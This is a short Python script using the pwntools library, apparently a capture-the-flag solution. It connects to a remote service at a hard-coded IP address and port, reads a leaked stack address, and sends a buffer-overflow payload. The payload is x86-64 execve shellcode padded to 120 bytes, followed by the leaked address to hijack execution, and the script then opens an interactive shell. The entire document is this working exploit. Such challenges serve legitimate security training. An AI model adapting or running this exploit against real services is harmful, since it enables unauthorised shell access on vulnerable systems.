from pwn import *

ip = "140.110.112.77"
port = 2119

context.arch = "amd64"

r = remote(ip, port)
# r = process("./shellcode")

addr = int(r.recvline().split()[-1], 16)
log.info(hex(addr))

payload = b""
payload += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05".ljust(120)
payload += p64(addr)

r.sendline(payload)

r.interactive()
